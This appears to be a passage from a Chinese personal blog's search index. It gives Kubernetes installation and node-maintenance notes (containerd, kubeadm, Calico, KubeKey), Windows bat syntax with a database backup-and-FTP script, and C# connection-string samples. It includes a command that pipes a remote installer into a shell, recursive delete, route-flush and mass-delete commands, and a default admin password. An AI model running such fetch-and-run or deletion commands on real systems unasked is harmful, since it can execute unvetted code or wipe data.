#uncomment to enable the experimental sbservice (sandboxed) version of containerd/cri integration #Environment=\"ENABLE_CRI_SANDBOXES=sandboxed\" ExecStartPre=-/sbin/modprobe overlay ExecStart=/usr/local/bin/containerd Type=notify Delegate=yes KillMode=process Restart=always RestartSec=5 # Having non-zero Limit*s causes performance problems due to accounting overhead # in the kernel. We recommend using cgroups to do container-local accounting. LimitNPROC=infinity LimitCORE=infinity LimitNOFILE=infinity # Comment TasksMax if your systemd version does not supports it. # Only systemd 226 and above support this version. TasksMax=infinity OOMScoreAdjust=-999 [Install] WantedBy=multi-user.target mkdir -p /etc/containerd containerd config default \u003e /etc/containerd/config.toml vim /etc/containerd/config.toml # https://github.com/containerd/containerd/issues/4203#issuecomment-651532765 systemdGroup = true sandbox_image = \"registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.9\" systemctl enable containerd --now # 开始安装runc # 安装c编译器和gperf # apt install build-essential gperf -y # 下载https://github.com/opencontainers/runc/releases libseccomp-2.5.4.tar.gz和runc.amd64 tar xf libseccomp-2.5.4.tar.gz cd libseccomp-2.5.4/ ./configure make \u0026\u0026 make install # 验证 find / -name \"libseccomp.so\" chmod +x runc.amd64 把这个runc替换掉containerd的sbin里的runc install -m 755 runc.amd64 /usr/local/sbin/runc # 下载https://github.com/containernetworking/plugins/releases mkdir -p /opt/cni/bin tar Cxzvf /opt/cni/bin cni-plugins-linux-amd64-v1.4.0.tgz ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/:3:2","series":null,"tags":["blog","k8s"],"title":"安装k8s","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/#容器相关"},{"categories":["blog"],"content":" 安装 kubeadm # 阿里源 curl https://mirrors.aliyun.com/kubernetes/apt/doc/apt-key.gpg -o k8s.gpg gpg --dearmor -o /etc/apt/keyrings/k8s.gpg k8s.gpg cat \u003c\u003cEOF \u003e/etc/apt/sources.list.d/kubernetes.list deb [signed-by=/etc/apt/keyrings/k8s.gpg] https://mirrors.aliyun.com/kubernetes/apt/ kubernetes-xenial main EOF apt update -y apt install -y kubelet kubeadm kubectl systemctl enable kubelet --now ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/:3:3","series":null,"tags":["blog","k8s"],"title":"安装k8s","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/#安装-kubeadm"},{"categories":["blog"],"content":" kubeadm 初始化kubeadm-init 具体做了什么？ master 节点启动： 当前环境检查，确保当前主机可以部署 kubernetes 检查容器引擎，镜像拉取情况 生成 kubernetes 对外提供服务所需要的各种私钥以及数字证书 证书存放在 /etc/kubernetes/pki 的 *.key *.cer 生成 kubernetes 控制组件的 kubeconfig 文件 存放在 /etc/kubernetes 的 *.conf 生成 kubernetes 控制组件的 pod 对象需要的 manifest 文件 /etc/kubernetes/manifests 下 etcd.yaml kube-apiserver.yaml kube-controller-manager.yaml kube-scheduler.yaml 为集群控制节点添加相关的标识，不让主节点参与 node 角色工作 输入命令 kubectl describe nodes master1 看到 Taints: node-role.kubernetes.io/master:NoSchedule 如果没有在 yaml 配置，这可以手动配置 kubectl taint nodes master1 node-role.kubernetes.io/master:NoSchedule 生成集群的统一认证的 token 信息，方便其他节点加入到当前的集群 kube-public 有一个 configmap 叫 cluster-info，里面存放着 token 等连接信息 进行基于 TLS 的安全引导相关的配置、角色策略、签名请求、自动配置策略 kubelet 会使用这个 /etc/kubernetes/kubelet.conf 配置文件 为集群安装 DNS 和 kube-porxy 插件 kube-system 空间下面 如果 cni 网络插件没有弄好，coredns 等几个容器会运行失败 node 节点加入 当前环境检查，读取相关集群配置信息 容器引擎是否安装，通过 kubectl -n kube-system get cm kubeadm-config -o yaml 获取配置 获取集群相关数据后启动 kubelet 服务 证书信息 /var/lib/kubelet/config.yaml 启动参数信息 /var/lib/kubelet/kubeadm-flags.env 启动 获取认证信息后，基于证书方式进行通信 [!info] 如果网络有问题, 参考 docker镜像源 从国内先拉取镜像再打上 tag. kubeadm config images list 查看需要用到的镜像 kubeadm config images pull 可以实现拉取镜像 也可以使用参数 --image-repository 指定国内源. 初始化命令如下: # 初始化 kubeadm init --image-repository='registry.cn-hangzhou.aliyuncs.com/google_containers' \\ --kubernetes-version=v1.28.2 \\ --service-cidr=10.96.0.0/12 \\ --pod-network-cidr=10.244.0.0/16 \\ --apiserver-advertise-address=192.168.2.180 \\ --cri-socket unix:///var/run/containerd/containerd.sock 可以跳过, 或使用参数 --config config.yml 文件初始化 (kubeadm config print init-defaults) apiVersion: kubeadm.k8s.io/v1beta3 # 不同版本的api版本不一样 # 节点加入时，认证token授权相关的基本信息。一般在内网比较安全，无需改动 bootstrapTokens: - groups: - system:bootstrappers:kubeadm:default-node-token token: abcdef.0123456789abcdef ttl: 24h0m0s usages: - signing - authentication kind: InitConfiguration # 第一个master节点配置的入口 localAPIEndpoint: advertiseAddress: 192.168.31.221 # 第一个master的ip bindPort: 6443 # node节点注册到master集群的通信方式 nodeRegistration: criSocket: unix:///var/run/containerd/containerd.sock imagePullPolicy: IfNotPresent name: master1 # 第一个master的名字 taints: null # taints: # - effect: NoSchedule # key: node-role.kubernets.io/master --- # 基本的集群属性信息 apiServer: timeoutForControlPlane: 4m0s apiVersion: kubeadm.k8s.io/v1beta3 certificatesDir: /etc/kubernetes/pki clusterName: kubernetes # 默认没有这个，多个master的时候，这里填keepalived的vip地址 # controlPlaneEndpoint: vip:6443 controllerManager: {} dns: {} # kubernetes的数据管理方式 etcd: local: dataDir: /var/lib/etcd # 镜像仓库的配置 imageRepository: registry.cn-hangzhou.aliyuncs.com/google_containers kind: ClusterConfiguration # kubernetes版本的定制 kubernetesVersion: 1.27.0 # kubernetes的网络基本信息 networking: dnsDomain: cluster.local serviceSubnet: \"10.96.0.0/12\" podSubnet: \"10.244.0.0/16\" scheduler: {} --- apiVersion: kubeproxy.config.k8s.io/v1alpha1 kind: KubeProxyConfiguration mode: ipvs ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/:3:4","series":null,"tags":["blog","k8s"],"title":"安装k8s","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/#kubeadm-初始化"},{"categories":["blog"],"content":" 网络组件 # calico网络插件网段 # 这里应该和kubeadm init --pod-network-cidr=192.168.0.0/16 一致!!! 10.244.0.0/16 # https://docs.tigera.io/calico/latest/getting-started/kubernetes/quickstart kubectl create -f https://raw.githubusercontent.com/projectcalico/calico/v3.26.0/manifests/tigera-operator.yaml kubectl 下面这个 yml # This section includes base Calico installation configuration. # For more information, see: https://projectcalico.docs.tigera.io/master/reference/installation/api#operator.tigera.io/v1.Installation apiVersion: operator.tigera.io/v1 kind: Installation metadata: name: default spec: # Configures Calico networking. calicoNetwork: # Note: The ipPools section cannot be modified post-install. ipPools: - blockSize: 26 cidr: 10.244.0.0/16 encapsulation: VXLANCrossSubnet natOutgoing: Enabled nodeSelector: all() --- # This section configures the Calico API server. # For more information, see: https://projectcalico.docs.tigera.io/master/reference/installation/api#operator.tigera.io/v1.APIServer apiVersion: operator.tigera.io/v1 kind: APIServer metadata: name: default spec: {} 启用 ipvs: kubectl edit configmap kube-proxy -n kube-system mode: ipvs kubectl rollout restart daemonset kube-proxy -n kube-system # 或者一个一个来 kubectl delete po -n kube-system kube-proxy-xxx # 验证使用了ipvs kubectl logs kube-proxy-xxx -n kube-system | grep \"Using ipvs Proxier\" # 新建service应该会有日志出现 kubectl logs -f -n kube-system -l k8s-app=kube-proxy # ipvsadm可以帮助我们查看规则 apt install ipvsadm -y # 查看所有规则 ipvsadm -Ln # 出来的记录指向多个ip，正好就是service的endpoint里面的ip ipvsadm -Ln | egrep -A2 'service的cluster-ip' 验证安装情况: # 每个节点都会有一个 pod/calico-node 处于 running 状态 kubectl get all -A -o wide |grep calico ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/:3:5","series":null,"tags":["blog","k8s"],"title":"安装k8s","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/#网络组件"},{"categories":["blog"],"content":" Ingress kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.8.1/deploy/static/provider/cloud/deploy.yaml ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/:3:6","series":null,"tags":["blog","k8s"],"title":"安装k8s","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/#ingress"},{"categories":["blog"],"content":" kubeadm 管理操作","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/:4:0","series":null,"tags":["blog","k8s"],"title":"安装k8s","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/#kubeadm-管理操作"},{"categories":["blog"],"content":" 节点重置/扩缩容 冻结节点 驱离现有资源 删除节点 清理环境 清理遗留信息 重启主机 # 冻结 kubectl cordon xxxx-node # 驱离 # 会先让apiserver删除pod，然后被replicateSet发现后，写入新信息到etcd。然后etcd kubectl drain xxx-node --force=true --ignore-daemonsets=true --delete-emptydir-data=true # 删除节点 kubectl delete nodes xxx-node # 在被移除节点上操作 kubeadm reset # 清理资源 rm -rf /etc/cni/net.d/* # master节点要删除 ~/.kube # 可以跳过，直接到重启部分 tree /etc/kubernetes # 如果有文件就清理 # 重启一下 systemctl restart kubelet docker # 如果有网络组件，应该清理掉 ifconfig # 手动关闭网卡，如果是calico也使用一样的方法清理掉 ifconfig flannel.1 down # 清理ip route ip route list ip route del 192.168.1.0/24 # 刷新缓存 ip route flush cache # 重启一下 reboot # 重新加入 kubeadm join ... ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/:4:1","series":null,"tags":["blog","k8s"],"title":"安装k8s","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/#节点重置扩缩容"},{"categories":["blog"],"content":" 生成加入集群的命令 # 这是node节点的加入命令 kubeadm token create --print-join-command ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/:4:2","series":null,"tags":["blog","k8s"],"title":"安装k8s","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/#生成加入集群的命令"},{"categories":["blog"],"content":" 加入新的 master 节点第一台 master 的 kubeadm 初始化后： kubeadm init phase upload-certs --upload-certs 得到 key kubeadm join ... --control-plane --certificate-key {上面的key} ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/:4:3","series":null,"tags":["blog","k8s"],"title":"安装k8s","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/#加入新的-master-节点"},{"categories":["blog"],"content":" 升级集群 确定 k8s 的版本一致 kubeadm version kubectl version kubectl get nodes 升级 kubeadm 的版本 升级 kubeadm upgrade plan kubeadm upgrade apply v 1.28.4 升级 kubectl，kubelet 版本 systemctl daemon-reload systemctl restart kubelet 升级 worker 节点 kubectl drain worker-node –ignore-daemonsets 升级 kubelet 版本 systemctl daemon-reload systemctl restart kubelet kubectl uncordon worker-node 重复第一步来验证升级 升级完成 kubeadm 后，可以 kubeadm config images pull 来提前拉取镜像 ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/:4:4","series":null,"tags":["blog","k8s"],"title":"安装k8s","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/#升级集群"},{"categories":["blog"],"content":" kubekey 安装","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/:5:0","series":null,"tags":["blog","k8s"],"title":"安装k8s","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/#kubekey-安装"},{"categories":["blog"],"content":" 基础准备 # 关闭防火墙 systemctl disable firewalld # 关闭swap swapon --show # 在 /etc/sysctl.conf 中添加 vm.swappiness=0 echo \"vm.swappiness=0\" \u003e\u003e /etc/sysctl.conf # 如果有内容，那么去 /etc/fstab 注释掉下面的东西 #/swap.img none swap sw 0 0 # 重启电脑验证 swapon --show # 关闭selinux apt install selinux-utils # 查看输出 getenforce # 安装依赖 apt install socat conntrack ebtables ipset -y ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/:5:1","series":null,"tags":["blog","k8s"],"title":"安装k8s","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/#基础准备"},{"categories":["blog"],"content":" 安装 # 安装kubekey工具 export KKZONE=cn curl -sfL https://get-kk.kubesphere.io | VERSION=v1.2.1 sh - chmod +x kk # 创建配置 ./kk create config # 编辑配置文件 vim config-sample.yaml # 开始安装 ./kk create cluster -f config-sample.yaml --with-kubesphere # 确定没问题就yes # 如果上面没有--with-kubesphere，手动安装的话 kubectl apply -f https://github.com/kubesphere/ks-installer/releases/download/v3.2.1/kubesphere-installer.yaml kubectl apply -f https://github.com/kubesphere/ks-installer/releases/download/v3.2.1/cluster-configuration.yaml # 检查安装日志 kubectl logs -n kubesphere-system $(kubectl get pod -n kubesphere-system -l app=ks-install -o jsonpath='{.items[0].metadata.name}') -f # 验证所有pod都起来了 kubectl get pod --all-namespaces # 检查控制台端口，默认30880 kubectl get svc/ks-console -n kubesphere-system # 访问nodeport ip:30880 admin/P@88w0rd ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/:5:2","series":null,"tags":["blog","k8s"],"title":"安装k8s","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/#安装"},{"categories":["blog"],"content":" 集群管理 # 从集群创建配置文件 ./kk create config --from-cluster # 或 ./kk create config -f kubeconfig配置文件 # 添加节点 # 编辑配置 ./kk add nodes -f sample.yaml # 删除节点 # 界面停止调度 # 编辑配置 ./kk delete node \u003cnodeName\u003e -f config-sample.yaml ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/:5:3","series":null,"tags":["blog","k8s"],"title":"安装k8s","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/#集群管理"},{"categories":["blog"],"content":" 配置文件 demo apiVersion: kubekey.kubesphere.io/v1alpha1 kind: Cluster metadata: name: sample spec: hosts: - {name: master, address: 192.168.10.71, internalAddress: 192.168.10.71, user: root, password: 密码} - {name: node1, address: 192.168.10.72, internalAddress: 192.168.10.72, user: root, password: 密码} - {name: node2, address: 192.168.10.73, internalAddress: 192.168.10.73, user: root, password: 密码} roleGroups: etcd: - master master: - master worker: - node1 - node2 controlPlaneEndpoint: ##Internal loadbalancer for apiservers #internalLoadbalancer: haproxy domain: lb.kubesphere.local address: \"\" port: 6443 kubernetes: version: v1.21.5 clusterName: cluster.local network: plugin: calico kubePodsCIDR: 10.233.64.0/18 kubeServiceCIDR: 10.233.0.0/18 registry: registryMirrors: [\"https://u7hlore1.mirror.aliyuncs.com\"] insecureRegistries: [] privateRegistry: \"\" addons: [] ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/:5:4","series":null,"tags":["blog","k8s"],"title":"安装k8s","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/#配置文件-demo"},{"categories":["blog"],"content":" 参考链接 kubeadm-YouTube安装k8s视频，kubeadm-视频中的文档地址 kubekey-多节点安装 (kubesphere.io) ingress官方文档地址 ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/:6:0","series":null,"tags":["blog","k8s"],"title":"安装k8s","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%AE%89%E8%A3%85k8s/#参考链接"},{"categories":["blog"],"content":" 简介这里记录小米手机到手后的配置. ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B0%8F%E7%B1%B3%E6%89%8B%E6%9C%BA%E9%85%8D%E7%BD%AE/:1:0","series":null,"tags":["blog"],"title":"小米手机配置","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B0%8F%E7%B1%B3%E6%89%8B%E6%9C%BA%E9%85%8D%E7%BD%AE/#简介"},{"categories":["blog"],"content":" 内容","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B0%8F%E7%B1%B3%E6%89%8B%E6%9C%BA%E9%85%8D%E7%BD%AE/:2:0","series":null,"tags":["blog"],"title":"小米手机配置","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B0%8F%E7%B1%B3%E6%89%8B%E6%9C%BA%E9%85%8D%E7%BD%AE/#内容"},{"categories":["blog"],"content":" 相册 相机保存地理位置信息 相册分享去除地址信息 ","date":"2023-08-16","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B0%8F%E7%B1%B3%E6%89%8B%E6%9C%BA%E9%85%8D%E7%BD%AE/:2:1","series":null,"tags":["blog"],"title":"小米手机配置","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B0%8F%E7%B1%B3%E6%89%8B%E6%9C%BA%E9%85%8D%E7%BD%AE/#相册"},{"categories":["blog"],"content":"这里记录 [[笔记/point/windows|windows]] 的 bat 脚本常用语法.推荐用 [[笔记/point/powershell|powershell]] 脚本, 而不是 bat.","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/bat%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/","series":null,"tags":["blog","windows"],"title":"bat常用语法","uri":"/posts/%E7%AC%94%E8%AE%B0/bat%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/"},{"categories":["blog"],"content":" 简介这里记录 windows 的 bat 脚本常用语法. 推荐用 powershell 脚本, 而不是 bat. ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/bat%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/:1:0","series":null,"tags":["blog","windows"],"title":"bat常用语法","uri":"/posts/%E7%AC%94%E8%AE%B0/bat%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/#简介"},{"categories":["blog"],"content":" 语法","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/bat%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/:2:0","series":null,"tags":["blog","windows"],"title":"bat常用语法","uri":"/posts/%E7%AC%94%E8%AE%B0/bat%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/#语法"},{"categories":["blog"],"content":" echo echo hello 输出显示 hello ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/bat%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/:2:1","series":null,"tags":["blog","windows"],"title":"bat常用语法","uri":"/posts/%E7%AC%94%E8%AE%B0/bat%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/#echo"},{"categories":["blog"],"content":" 写入和追加 echo hello \u003ee:\\1.txt 覆盖1.txt文件，写入hello echo hello \u003e\u003ee:\\1.txt 往1.txt末尾追加字符串 hello ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/bat%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/:2:2","series":null,"tags":["blog","windows"],"title":"bat常用语法","uri":"/posts/%E7%AC%94%E8%AE%B0/bat%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/#写入和追加"},{"categories":["blog"],"content":" 注释 rem rem 开始执行xxx \u003e bat里面的注释，在执行过程中，不会输出 ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/bat%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/:2:3","series":null,"tags":["blog","windows"],"title":"bat常用语法","uri":"/posts/%E7%AC%94%E8%AE%B0/bat%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/#注释-rem"},{"categories":["blog"],"content":" 跳转 goto goto 指定代码块 \u003e 执行完以后，按照当前位置执行下面的代码，有可能进入死循环 ---------------------------------------------------- goto :eof \u003e 可以终止此次的跳转 ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/bat%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/:2:4","series":null,"tags":["blog","windows"],"title":"bat常用语法","uri":"/posts/%E7%AC%94%E8%AE%B0/bat%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/#跳转-goto"},{"categories":["blog"],"content":" 终止程序 exit==无论是否嵌套了 bat 执行，执行到 exit，一切终止== ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/bat%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/:2:5","series":null,"tags":["blog","windows"],"title":"bat常用语法","uri":"/posts/%E7%AC%94%E8%AE%B0/bat%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/#终止程序-exit"},{"categories":["blog"],"content":" 代码块:xx goto xx \u003e 跳转到xx这个代码块，之后按照顺序执行 ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/bat%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/:2:6","series":null,"tags":["blog","windows"],"title":"bat常用语法","uri":"/posts/%E7%AC%94%E8%AE%B0/bat%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/#代码块"},{"categories":["blog"],"content":" 条件判断 ifif %errorlevel%==0 (goto a) else (goto b) 如果上一条语句执行成功 跳转到a 否则 跳转到b ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/bat%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/:2:7","series":null,"tags":["blog","windows"],"title":"bat常用语法","uri":"/posts/%E7%AC%94%E8%AE%B0/bat%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/#条件判断-if"},{"categories":["blog"],"content":" 时间日期%date:~0,10% %time:~0,8% echo %date:~0,10% %time:~0,8% 输出显示 2016/08/20 4:07:08 \u003e截取%date%的前10位，%time%的前八位 ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/bat%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/:2:8","series":null,"tags":["blog","windows"],"title":"bat常用语法","uri":"/posts/%E7%AC%94%E8%AE%B0/bat%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/#时间日期"},{"categories":["blog"],"content":" 调用脚本 call call e:\\1.bat 调用另外一个bat脚本 1.bat中，如果结尾是goto:eof 或者无，则跳转回来 1.bat中，如果结尾是exit,则调用的主bat也会退出！ ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/bat%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/:2:9","series":null,"tags":["blog","windows"],"title":"bat常用语法","uri":"/posts/%E7%AC%94%E8%AE%B0/bat%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/#调用脚本-call"},{"categories":["blog"],"content":" 循环 forfiles forfiles /p 路径文件夹 /s /m *.* /d -800 /c \"cmd /c del @file\" /s 扫描子目录 /m 指定扫描类型 /d 指定天数 -800 代表800天前的文件 /c 指定的命令 cmd /c 隐式执行 ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/bat%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/:2:10","series":null,"tags":["blog","windows"],"title":"bat常用语法","uri":"/posts/%E7%AC%94%E8%AE%B0/bat%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/#循环-forfiles"},{"categories":["blog"],"content":" 其它 \u003eflashfxp 上传下载 d:\\FlashFXP\\flashfxp.exe -c4 -upload ftp://用户名:密码@ip和端口 -localpath=\"E:\\backup\\huaxinqu_%date:~0,10%DAY.rar\" -remotepath=\"/backup/huaxinqu_%date:~0,10%DAY.rar\" -download/-upload 下载上传 -c1 打开软件执行 -c4 执行完毕后关闭 ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/bat%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/:2:11","series":null,"tags":["blog","windows"],"title":"bat常用语法","uri":"/posts/%E7%AC%94%E8%AE%B0/bat%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/#其它"},{"categories":["blog"],"content":" 示例 echo 开始备份 %date:~0,10% %time:~0,8% \u003e\u003e E:\\1.txt expdp system/\"\"\"密码\"\"\" directory=EXPDP_DIR exclude=STATISTICS,INDEX dumpfile=huaxinqu_%date:~0,10%DAY.dmp logfile=huaxinqu_%date:~0,10%DAY.log network_link=remote_hydb tables=qx_huaxin.t_zs101_06 if %errorlevel%==0 (goto cg1) else (goto sb1) :sb1 echo 备份失败 %date:~0,10% %time:~0,8%\u003e\u003e E:\\1.txt exit :sb2 echo 压缩失败 %date:~0,10% %time:~0,8%\u003e\u003e E:\\1.txt exit :sb3 echo ftp上传失败 %date:~0,10% %time:~0,8%\u003e\u003eE:\\1.txt exit :cg1 echo 备份成功 %date:~0,10% %time:~0,8% \u003e\u003e E:\\1.txt echo 开始压缩 %date:~0,10% %time:~0,8% \u003e\u003e E:\\1.txt C:\\progra~1\\winrar\\winrar.exe a -ibck E:\\backup\\huaxinqu_%date:~0,10%DAY.rar E:\\backup\\huaxinqu_%date:~0,10%DAY.DMP E:\\backup\\huaxinqu_%date:~0,10%DAY.log if %errorlevel%==0 (goto cg2) else (goto sb2) :cg2 echo 压缩成功 %date:~0,10% %time:~0,8% \u003e\u003e E:\\1.txt echo 开始ftp上传 %date:~0,10% %time:~0,8% \u003e\u003e E:\\1.txt d:\\FlashFXP\\flashfxp.exe -c4 -upload ftp://用户名:密码@ip和端口 -localpath=\"E:\\backup\\huaxinqu_%date:~0,10%DAY.rar\" -remotepath=\"/backup/huaxinqu_%date:~0,10%DAY.rar\" if %errorlevel%==0 (goto cg3) else (goto sb3) :cg3 echo ftp上传成功 %date:~0,10% %time:~0,8% \u003e\u003e E:\\1.txt del /f E:\\backup\\huaxinqu_%date:~0,10%DAY.dmp del /f E:\\backup\\huaxinqu_%date:~0,10%DAY.log if %errorlevel%==0 (echo 删除本地文件成功！ %date:~0,10% %time:~0,8% \u003e\u003eE:\\1.txt) else (echo 删除本地文件失败！ %date:~0,10% %time:~0,8% \u003e\u003eE:\\1.txt ) ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/bat%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/:3:0","series":null,"tags":["blog","windows"],"title":"bat常用语法","uri":"/posts/%E7%AC%94%E8%AE%B0/bat%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/#示例"},{"categories":["blog"],"content":"记录 [[笔记/point/csharp|csharp]] 的代码配置.","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/","series":null,"tags":["blog","csharp"],"title":"csharp代码配置","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/"},{"categories":["blog"],"content":" 简介记录 csharp 的代码配置仅在开发过程中会用到。 ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/:1:0","series":null,"tags":["blog","csharp"],"title":"csharp代码配置","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/#简介"},{"categories":["blog"],"content":" 配置","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/:2:0","series":null,"tags":["blog","csharp"],"title":"csharp代码配置","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/#配置"},{"categories":["blog"],"content":" 数据库连接字符串 Mysql Server=ip或域名;Database=数据库;Uid=root;Pwd=密码;MinimumPoolSize=10;maximumpoolsize=50; SqlServersql server 连接配置 { \"ConnectionStrings\": { \"BloggingDatabase\": \"Data Source=your_server_ip;Database=your_database_name;User ID=your_username;Min Pool Size=10;Password=your_password;Connect Timeout=30;Encrypt=False;TrustServerCertificate=False;ApplicationIntent=ReadWrite;MultiSubnetFailover=False\" } } 代码使用 services.AddDbContextPool\u003cBloggingContext\u003e( options =\u003e{ options.UseSqlServer(Configuration.GetConnectionString(\"BloggingDatabase\")); } ,poolSize:64 ); ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/:2:1","series":null,"tags":["blog","csharp"],"title":"csharp代码配置","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/#数据库连接字符串"},{"categories":["blog"],"content":" 数据库连接字符串 Mysql Server=ip或域名;Database=数据库;Uid=root;Pwd=密码;MinimumPoolSize=10;maximumpoolsize=50; SqlServersql server 连接配置 { \"ConnectionStrings\": { \"BloggingDatabase\": \"Data 